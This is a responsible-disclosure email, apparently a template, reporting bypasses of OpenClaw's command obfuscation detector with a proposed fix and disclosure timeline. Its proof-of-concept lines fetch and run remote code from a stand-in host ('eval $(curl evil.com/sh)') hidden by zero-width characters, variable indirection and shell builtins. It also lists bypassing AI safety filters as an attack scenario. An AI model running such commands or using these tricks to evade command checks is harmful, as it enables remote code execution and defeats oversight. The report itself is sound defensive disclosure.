Subject: Security Vulnerability Report: Command Obfuscation Detection Bypass in OpenClaw (CVSS 8.6)

To: security@openclaw.ai

Hello OpenClaw Security Team,

I am writing to report a security vulnerability I discovered in OpenClaw's command obfuscation detection mechanism. This vulnerability allows attackers to bypass security controls and execute arbitrary commands.

---

## Executive Summary

**Vulnerability**: Command Obfuscation Detection Bypass
**Severity**: Critical (CVSS 8.6)
**Affected Versions**: OpenClaw <= 2026.3.10
**Attack Vector**: Remote (network-based)
**Bypass Rate**: 90% (18 out of 20 tested attack vectors)

---

## Vulnerability Description

The command obfuscation detection module (`src/infra/exec-obfuscation-detect.ts`) can be bypassed using multiple techniques:

### 1. Unicode Obfuscation (CRITICAL)

- Zero-width characters (U+200B, U+200C, U+200D, U+FEFF)
- Combining diacritical marks (e.g., e + U+0301)
- Lookalike characters (Cyrillic vs Latin letters)
- Bidirectional text override (U+202E)

**PoC**:
```bash
# Zero-width character bypass
e​v​a​l ​$​(​c​u​r​l ​e​v​i​l​.​c​o​m​/​s​h​)​
# Actual execution: eval $(curl evil.com/sh)

# Detected: false ❌
```

### 2. Variable Indirection (HIGH)

- Bash indirect expansion (`${!var}`)
- Set builtin indirection (`set -- eval sh; $@`)
- Arithmetic expansion (`$(( $(echo eval) ))`)

**PoC**:
```bash
cmd="eval"; ${cmd} $(curl evil.com/sh)
# Detected: false ❌
```

### 3. Shell Builtin Obfuscation (HIGH)

- `command eval $(curl evil.com/sh)`
- `type -P eval | xargs -I {} {} $(curl evil.com/sh)`
- `printf %s 'eva' 'l' | xargs -I {} {} $(curl evil.com/sh)`

### 4. Additional Bypasses

- Whitespace obfuscation (tab, form feed, vertical tab)
- Command grouping `(eval ...)` and `{eval;...}`
- Comment-based obfuscation

---

## Key Finding

**Critical Issue**: While OpenClaw has a `stripInvisibleUnicode()` function in `src/security/external-content.ts`, it is only used for web content sanitization, **NOT for command detection**. This means the protection exists but is not applied where it's needed most.

---

## Impact

| Deployment | Risk Level | Rationale |
|------------|------------|-----------|
| Public-facing | **CRITICAL** | Anyone can exploit remotely |
| Multi-tenant | **CRITICAL** | Isolation can be bypassed |
| Internal network | HIGH | Insider threat possible |
| Local development | MEDIUM | Requires local access |

**Attack Scenarios**:
1. Phishing attacks with visually obfuscated commands
2. Hiding malicious activity in logs
3. Bypassing AI model safety filters
4. Arbitrary command execution through gateway APIs

---

## Proof of Concept

I have developed a comprehensive PoC that demonstrates all bypass techniques:

**Files Available**:
- `test/poc-security-audit.test.ts` - Full test suite
- `scripts/demos/vulnerability-demo.ts` - Executable demonstration
- `docs/security/DISCLOSURE-ARTICLE.md` - Complete technical analysis

**Verification Results**:
```
Total: 20 attack vectors
Bypassed: 18/20 (90%)
Blocked: 2/20 (10%)
```

I can provide:
- [x] Detailed vulnerability analysis
- [x] Working PoC code
- [x] Proposed fix implementation
- [x] Independent verification results

---

## Proposed Fix

I have prepared a fix that addresses these issues:

1. Add Unicode normalization (NFC) before command detection
2. Implement variable indirection pattern detection
3. Add shell builtin obfuscation detection
4. Enhance control character validation
5. Add command length and depth limits

**Ready-to-deploy code**: Available in `docs/security/SRECOMMENDATIONS.md`

---

## Disclosure Timeline

I am committed to responsible disclosure. I propose the following timeline:

| Date | Milestone |
|------|-----------|
| 2026-03-12 | Initial report (today) |
| 2026-03-19 | Vendor acknowledgment (7 days) |
| 2026-04-11 | Patch release (30 days) |
| 2026-06-10 | Public disclosure (90 days) |

I am willing to:
- Extend the disclosure timeline if needed
- Coordinate embargo dates
- Assist with patch testing
- Review fix implementation

---

## Next Steps

1. Please acknowledge receipt of this report
2. Confirm if you would like the complete technical analysis
3. Let me know how you would like to proceed with CVE assignment
4. Provide a PGP key if you prefer encrypted communication

---

## Contact

**Reporter**: [Your Name]
**Email**: [Your Email]
**GitHub**: [Your GitHub Profile]
**PGP Key**: [Available upon request / attached]

I look forward to working with you to address this vulnerability and protect OpenClaw users.

Best regards,

[Your Name]

---

**Attachments Available**:
- Full vulnerability report (12 pages)
- PoC test suite (TypeScript)
- Executable demonstration script
- Proposed fix implementation (TypeScript)
- Independent verification results

---

**Reference**: This report follows responsible disclosure guidelines and CVE creation best practices.
